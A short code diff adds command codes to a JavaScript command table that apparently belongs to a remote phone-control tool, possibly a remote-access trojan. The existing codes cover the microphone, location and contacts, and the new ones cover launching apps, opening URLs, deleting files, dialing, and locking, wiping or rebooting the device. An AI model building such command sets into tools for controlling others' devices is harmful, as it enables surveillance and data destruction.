@@ -77,5 +77,12 @@ exports.orders = {
     mic: 'x0000mc',
     location: 'x0000lm',
     contacts: 'x0000cn',
-
+    apps: 'x0000apps',
+    runApp: 'x0000runApp',
+    openUrl: 'x0000openUrl',
+    deleteFileFolder: 'x0000deleteFF',
+    dialNumber: 'x0000dm',
+    lockDevice: 'x0000lockDevice',
+    wipeDevice: 'x0000wipeDevice',
+    rebootDevice: 'x0000rebootDevice',
 }
